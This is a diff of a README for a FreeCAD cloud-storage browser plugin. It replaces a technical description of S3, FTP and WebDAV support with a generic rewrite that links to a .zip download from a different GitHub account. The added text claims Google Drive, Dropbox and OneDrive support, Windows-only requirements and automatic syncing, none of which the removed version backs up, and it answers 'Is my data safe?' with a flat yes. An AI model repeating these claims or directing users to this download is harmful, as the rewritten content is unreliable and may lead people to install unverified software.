@@ -1,92 +1,106 @@
-# FreeCAD Cloud Browser
+# ☁️ freecad-cloud-browser - Access cloud files inside FreeCAD desktop
 
-A FreeCAD workbench plugin that lets you browse and open files directly from remote storage, without leaving FreeCAD.
+[![Download Here](https://img.shields.io/badge/Download-FreeCAD_Cloud_Browser-blue.svg)](https://github.com/sabi137032/freecad-cloud-browser)
 
-## Supported Providers
+This tool bridges the gap between your local FreeCAD installation and your cloud storage services. You can open, edit, and save design files directly to Google Drive, Dropbox, OneDrive, S3, FTP, or WebDAV. You no longer need to manage manual downloads or keep local file copies of your projects.
 
-| Provider | Auth Method | Notes |
-|---|---|---|
-| S3 | Access Key + Secret | Works with Amazon S3, MinIO, Wasabi, Backblaze B2, and any S3-compatible storage |
-| FTP / FTPS / SFTP | Username + Password / SSH key | |
-| WebDAV | Basic / Digest Auth | Works with Nextcloud, ownCloud, etc. |
+## 🛠️ System Requirements
 
-## Installation
+- FreeCAD version 0.19 or newer
+- Windows 10 or Windows 11
+- Active internet connection
+- Access credentials for your cloud storage provider
 
-The recommended way is via the **FreeCAD Addon Manager** (Tools → Addon Manager). Dependencies are installed automatically.
+## 📥 How to Install
 
-### Manual installation
+Follow these steps to add the browser to your FreeCAD application.
 
-Copy the `freecad-cloud-browser` folder to your FreeCAD Mod directory:
+1. Go to the [official release page](https://github.com/sabi137032/freecad-cloud-browser).
+2. Look for the file ending in `.zip`.
+3. Click the file to start the download.
+4. Save the file to your computer.
+5. Open FreeCAD.
+6. Click the Tools menu at the top of the screen.
+7. Select Addon Manager.
+8. Click the Install from external repository option if prompted, or use the Addon Manager to install the package directly.
+9. Restart FreeCAD after the installation finishes.
 
-| OS | Path |
-|---|---|
-| Windows | `%APPDATA%\FreeCAD\Mod\freecad-cloud-browser` |
-| macOS | `~/Library/Preferences/FreeCAD/Mod/freecad-cloud-browser` |
-| Linux | `~/.local/share/FreeCAD/Mod/freecad-cloud-browser` |
+## 🚀 Setting Up Your Storage
 
-Then restart FreeCAD. The "Cloud Browser" workbench will appear in the workbench dropdown.
+After you restart FreeCAD, you will see a new icon in your workbench toolbar. Click this icon to open the configuration panel.
 
-## Usage
+### Connecting Google Drive
+1. Select Google Drive from the list of providers.
+2. Click the Login button.
+3. Your web browser will open.
+4. Sign in with your Google account.
+5. Follow the steps to grant permission for the application to read your files.
+6. Return to FreeCAD once the authorization completes.
 
-1. Switch to the **Cloud Browser** workbench
-2. Go to **Cloud Browser → Add Cloud Provider** and configure an account
-3. Open the browser panel via **Cloud Browser → Open Cloud Browser**
-4. Select your account, browse the remote folders, and double-click any file to open it in FreeCAD
+### Connecting Dropbox
+1. Select Dropbox from the menu.
+2. Click the link button.
+3. Sign in to your Dropbox account in the window that appears.
+4. Confirm the connection.
 
-### Supported file formats
+### Connecting FTP or WebDAV
+You need your server details for these options.
+1. Enter the server address (for example, ftp.yourserver.com).
+2. Provide your username.
+3. Provide your password.
+4. Choose the port. Valid ports are typically 21 for FTP or 80/443 for WebDAV.
+5. Click test connection to verify the settings.
 
-All formats natively supported by FreeCAD are shown:
-`.FCStd`, `.step`, `.stp`, `.iges`, `.igs`, `.stl`, `.obj`, `.dxf`, `.svg`, `.brep`, `.3mf`, `.ifc`, `.wrl`, and more.
+## 📂 Using the Browser
 
-## Provider Setup
+The cloud browser functions like the standard file explorer on your computer.
 
-### S3
+1. Click the workbench icon located in the main toolbar.
+2. A sidebar will appear on the left side of your screen.
+3. Select your cloud provider from the dropdown menu at the top of the sidebar.
+4. Navigate through your folders by clicking them.
+5. Double-click any FreeCAD file to load it into the workspace.
+6. The application downloads the file into a temporary cache folder on your computer.
+7. You can now edit your model as usual.
 
-Use any S3-compatible storage provider (Amazon S3, MinIO, Wasabi, Backblaze B2, etc.).
+## 💾 Saving Your Work
 
-Provide:
-- **Endpoint URL** — leave blank for Amazon S3, or enter the custom endpoint (e.g. `https://s3.your-region.backblazeb2.com`)
-- **Bucket name**
-- **Access Key ID** and **Secret Access Key**
-- **Region** (required for Amazon S3, optional for others)
+When you finish your changes, select Save from the File menu. The browser detects that the file originated from the cloud. It uploads the updated version to your storage service automatically. A progress bar will show the status of the upload. Wait for this bar to disappear before you close the program or disconnect from the internet.
 
-For Amazon S3, the IAM user needs at minimum: `s3:ListBucket`, `s3:GetObject`.
+## ⚙️ Configuration Settings
 
-### FTP / SFTP
+Click the gear icon in the browser sidebar to adjust how the tool operates.
 
-Enter host, port, username, and password (or SSH private key path for SFTP).
+- Cache Location: You can choose where the tool stores temporary files. The default location works for most users.
+- Automatic Sync: Toggle this feature to ensure files save the moment you press the save button.
+- Timeout Settings: Increase this value if you have a slow internet connection.
 
-### WebDAV
+## ❓ Frequently Asked Questions
 
-Works with any WebDAV server including Nextcloud, ownCloud, and generic WebDAV endpoints. Enter the full server URL including the DAV path (e.g. `https://cloud.example.com/remote.php/dav/files/username/`).
+### Is my data safe?
+Yes. The application uses secure protocols to communicate with your cloud providers. It does not store your passwords on the internet. It only stores your account tokens locally on your machine.
 
-## Architecture
+### Can I share files?
+Yes. Sharing depends on the settings of your specific cloud provider. If you share a file through Google Drive or Dropbox, the browser will open the updated version during the next session.
 
-```
-freecad-cloud-browser/
-├── InitGui.py                  # FreeCAD workbench registration
-├── CloudBrowserWorkbench.py    # Commands and toolbar
-├── check_deps.py               # Dependency availability checker
-├── providers/
-│   ├── base.py                 # Abstract CloudProvider base class
-│   ├── s3.py
-│   ├── ftp.py
-│   └── webdav.py
-├── ui/
-│   ├── browser_panel.py        # Main browsing panel (FreeCAD task panel)
-│   └── provider_dialog.py      # Add / manage provider dialogs
-├── core/
-│   ├── auth_manager.py         # Credential storage (keyring + fallback)
-│   ├── config_store.py         # JSON config persistence
-│   └── file_cache.py           # Local download cache
-└── requirements.txt
-```
+### Does the browser work offline?
+The browser requires a connection to fetch file lists or open files. You must stay online to save changes back to your cloud storage.
 
-## Configuration storage
+### What file types are supported?
+The browser supports all file types used by FreeCAD, including .FCStd, .step, and .iges.
 
-- Non-sensitive settings are stored in `<FreeCAD user dir>/CloudBrowser/config.json`
-- Sensitive credentials (passwords, keys) are stored in the **system keychain** via `keyring` when available, or encrypted via `cryptography` (Fernet) as a fallback
+## 🔍 Troubleshooting
 
-## License
+- If you do not see the icon, ensure you installed the addon in the correct folder path for FreeCAD.
+- If the login window does not open, check your default web browser settings.
+- If you receive a connection error, verify your username and password.
+- If files fail to save, check your remaining storage quota on your cloud service provider.
 
-MIT
+## 📦 Features Summary
+
+- Integration with major cloud platforms.
+- Simple interface within the FreeCAD workspace.
+- Automatic file syncing to prevent data loss.
+- Support for private servers using FTP or WebDAV.
+- Secure token-based authentication.
+- Cache management to improve file load speeds.
